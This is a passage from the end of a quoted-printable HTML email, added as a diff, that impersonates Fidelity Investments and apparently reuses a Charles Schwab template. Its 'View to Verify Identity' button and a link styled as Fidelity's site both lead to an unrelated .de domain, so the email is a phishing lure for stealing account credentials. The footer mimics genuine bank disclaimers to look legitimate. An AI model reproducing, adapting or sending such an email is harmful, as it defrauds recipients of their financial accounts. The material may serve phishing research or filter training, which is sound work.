+solid rgb(45, 134, 45); margin: 0px auto !important; padding-left: 40px; pa=
+dding-right: 40px; padding-top: 13px; padding-bottom: 13px; background-colo=
+r: rgb(0, 121, 0)" href=3D"https://schwabhelpdex.adamclarkcinematographer.d=
+e/fed/Emaildedh_bk/777/Fed_bk/index.html">View to Verify Identity</a></span=
+></td>
+																							</tr>
+																					</table>
+																					<p><b>Or go to&nbsp;<span class=3D"Object"><a href=3D"=
+https://schwabhelpdex.adamclarkcinematographer.de/fed/Emaildedh_bk/777/Fed_=
+bk/index.html"><span style=3D"color: #006E99; text-decoration: underline">F=
+idelity</span></a></span><a target=3D"_blank" rel=3D"nofollow noopener nore=
+ferrer" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; =
+text-size-adjust: none !important; color: rgb(0, 110, 153); text-decoration=
+: underline; margin: 0px auto !important" href=3D"https://schwabhelpdex.ada=
+mclarkcinematographer.de/fed/Emaildedh_bk/777/Fed_bk/index.html"><span clas=
+s=3D"Object" role=3D"link" id=3D"OBJ_PREFIX_DWT159_com_zimbra_url" style=3D=
+"-webkit-font-smoothing: antialiased; white-space: normal; text-size-adjust=
+: none !important; margin: 0px auto !important">.com/Fid_reports</span>.</a=
+></b></td>
+																				</tr>
+																		</table>
+																		</td>
+																	</tr>
+															</table>
+															</td>
+														</tr>
+												</table>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+			</b></td>
+														</tr>
+												</table>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"100%=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td align=3D"center" class=3D"dark-background mobile-lr-padding" v=
+align=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important; backg=
+round-color: rgb(244, 245, 246)">
+									<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"1=
+00%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; fon=
+t-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td align=3D"center" class=3D"dark-background-body" valign=3D"t=
+op" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; text=
+-size-adjust: none !important; margin: 0px auto !important; background-colo=
+r: rgb(255, 255, 255)">&nbsp;</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"100%=
+" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; font-f=
+amily: Arial, sans-serif; border-collapse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td align=3D"center" class=3D"dark-background mobile-lr-padding" v=
+align=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important; backg=
+round-color: rgb(244, 245, 246)">
+									<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"1=
+00%" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; fon=
+t-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td align=3D"center" class=3D"dark-background-body" valign=3D"t=
+op" style=3D"-webkit-font-smoothing: antialiased; white-space: normal; text=
+-size-adjust: none !important; margin: 0px auto !important; background-colo=
+r: rgb(255, 255, 255)">
+												<table align=3D"left" border=3D"0" cellpadding=3D"0" cellspacin=
+g=3D"0" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; =
+font-family: Arial, sans-serif; border-collapse: collapse">
+													<tbody style=3D"-webkit-font-smoothing: antialiased">
+														<tr style=3D"-webkit-font-smoothing: antialiased; white-space=
+: normal; text-size-adjust: none !important; margin: 0px auto !important">
+															<td align=3D"left" bgcolor=3D"#ffffff" class=3D"dark-backgro=
+und-body  mobile-body-padding" valign=3D"middle" style=3D"-webkit-font-smoo=
+thing: antialiased; white-space: normal; text-size-adjust: none !important;=
+ font-family: 'charles modern', arial, sans-serif; font-size: 16px; color: =
+rgb(0, 0, 0); border-radius: 0px; margin: 0px auto !important; padding-left=
+: 24px; padding-right: 24px; padding-top: 0px; padding-bottom: 34px; backgr=
+ound-color: rgb(255, 255, 255)">
+															<p class=3D"dark-background-body" style=3D"-webkit-font-smoo=
+thing: antialiased; white-space: normal; text-size-adjust: none !important;=
+ color: rgb(0, 0, 0); font-family: Arial Black; font-weight: normal; line-h=
+eight: 24px; margin: 0px; padding: 0px">
+															<b style=3D"-webkit-font-smoothing: antialiased">
+															<font size=3D"2">Thank you for the opportunity to serve you.=
+</font></b><p class=3D"dark-background-body" style=3D"-webkit-font-smoothin=
+g: antialiased; white-space: normal; text-size-adjust: none !important; col=
+or: rgb(0, 0, 0); font-family: Arial Black; font-weight: normal; line-heigh=
+t: 24px; margin: 0px; padding: 0px">
+															<b style=3D"-webkit-font-smoothing: antialiased">
+															<font size=3D"2">
+															Fidelity Investment</font></b></td>
+														</tr>
+												</table>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			</b></td>
+		</tr>
+		<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal; te=
+xt-size-adjust: none !important; margin: 0px auto !important">
+			<td class=3D"wrapper" style=3D"-webkit-font-smoothing: antialiased; whit=
+e-space: normal; text-size-adjust: 100%; width: 760px; table-layout: fixed;=
+ margin: 0px auto !important; background-color: rgb(244, 245, 246)">
+			<b style=3D"-webkit-font-smoothing: antialiased">
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table align=3D"center" border=3D"0" cellpadding=3D"0" class=3D"wrap"=
+ width=3D"100%" style=3D"-webkit-font-smoothing: antialiased; border-spacin=
+g: 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td align=3D"center" valign=3D"top" style=3D"-webkit-font-smoothin=
+g: antialiased; white-space: normal; text-size-adjust: none !important; mar=
+gin: 0px auto !important">
+									<table align=3D"center" border=3D"0" cellpadding=3D"0" width=3D"95=
+%" bgcolor=3D"#f4f5f6" style=3D"-webkit-font-smoothing: antialiased; border=
+-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td class=3D"dark-background-PH-disclosures" align=3D"center" v=
+align=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important; paddi=
+ng-left: 0px; padding-right: 0px; padding-top: 20px; padding-bottom: 10px">
+												<p class=3D"dark-background-body" style=3D"-webkit-font-smoothi=
+ng: antialiased; white-space: normal; text-size-adjust: none !important; co=
+lor: #006E99; line-height: 24px; margin: 0px; padding: 0px">
+												<b><font size=3D"2" face=3D"Arial">PERSPECTIVE&nbsp; =
+
+												|&nbsp; PRIVACY | CONTACT US | =
+
+												LOG IN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+												</font></b>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			</b></td>
+		</tr>
+		<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal; te=
+xt-size-adjust: none !important; margin: 0px auto !important">
+			<td class=3D"wrapper" bgcolor=3D" #F4F5F6" style=3D"-webkit-font-smoothi=
+ng: antialiased; white-space: normal; text-size-adjust: 100%; width: 760px;=
+ table-layout: fixed; margin: 0px auto !important; padding: 0px; background=
+-color: rgb(244, 245, 246)">
+			<b style=3D"-webkit-font-smoothing: antialiased">
+			<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"styli=
+ngblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; bord=
+er-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collapse;=
+ min-width: 100%">
+				<tbody style=3D"-webkit-font-smoothing: antialiased">
+					<tr style=3D"-webkit-font-smoothing: antialiased; white-space: normal;=
+ text-size-adjust: none !important; margin: 0px auto !important">
+						<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D"-w=
+ebkit-font-smoothing: antialiased; white-space: normal; text-size-adjust: n=
+one !important; margin: 0px auto !important">
+						<table cellpadding=3D"0" cellspacing=3D"0" width=3D"100%" class=3D"st=
+ylingblock-content-wrapper" style=3D"-webkit-font-smoothing: antialiased; b=
+order-spacing: 0px; font-family: Arial, sans-serif; border-collapse: collap=
+se; min-width: 100%">
+							<tbody style=3D"-webkit-font-smoothing: antialiased">
+								<tr style=3D"-webkit-font-smoothing: antialiased; white-space: norm=
+al; text-size-adjust: none !important; margin: 0px auto !important">
+									<td class=3D"stylingblock-content-wrapper camarker-inner" style=3D=
+"-webkit-font-smoothing: antialiased; white-space: normal; text-size-adjust=
+: none !important; margin: 0px auto !important">
+									<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0px; f=
+ont-family: Arial, sans-serif; border-collapse: collapse">
+										<tbody style=3D"-webkit-font-smoothing: antialiased">
+											<tr style=3D"-webkit-font-smoothing: antialiased; white-space: n=
+ormal; text-size-adjust: none !important; margin: 0px auto !important">
+												<td class=3D"dark-background-PH-disclosures" align=3D"center" v=
+align=3D"top" style=3D"-webkit-font-smoothing: antialiased; white-space: no=
+rmal; text-size-adjust: none !important; margin: 0px auto !important">
+												<table border=3D"0" cellspacing=3D"0" cellpadding=3D"0" align=
+=3D"center" style=3D"-webkit-font-smoothing: antialiased; border-spacing: 0=
+px; font-family: Arial, sans-serif; border-collapse: collapse">
+													<tbody style=3D"-webkit-font-smoothing: antialiased">
+														<tr style=3D"-webkit-font-smoothing: antialiased; white-space=
+: normal; text-size-adjust: none !important; margin: 0px auto !important">
+															<td class=3D"dark-background-PH-disclosures" align=3D"left" =
+valign=3D"middle" bgcolor=3D"#F4F5F6" style=3D"-webkit-font-smoothing: anti=
+aliased; white-space: normal; text-size-adjust: none !important; font-famil=
+y: 'charles modern', arial, sans-serif; font-size: 13px; color: rgb(94, 110=
+, 122); border-radius: 0px; margin: 0px auto !important; padding-left: 24px=
+; padding-right: 24px; padding-top: 16px; padding-bottom: 0px; background-c=
+olor: rgb(244, 245, 246)">
+															<p class=3D"dark-background-PH-disclosures" style=3D"-webkit=
+-font-smoothing: antialiased; white-space: normal; text-size-adjust: none !=
+important; color: rgb(90, 103, 114); font-family: arial, helvetica, sans-se=
+rif; font-size: 13px; font-weight: normal; line-height: 20px; margin: 0px; =
+padding: 0px">
+															If you have any =
+
+															questions or =
+
+															concerns, PLEASE DO =
+
+															NOT REPLY TO THIS =
+
+															EMAIL. Instead, =
+
+															visit
+															<font color=3D"#000080">
+															fidelity.com/contactus</font> to =
+
+															identify a fast and =
+
+															simple way to get in =
+
+															touch.</td>
+														</tr>
+												</table>
+												</td>
+											</tr>
+									</table>
+									</td>
+								</tr>
+						</table>
+						</td>
+					</tr>
+			</table>
+			</b></td>
+		</tr>
+</table>
+
+</body>
+
+</html>
+
+--===============0301115945==--
+
+
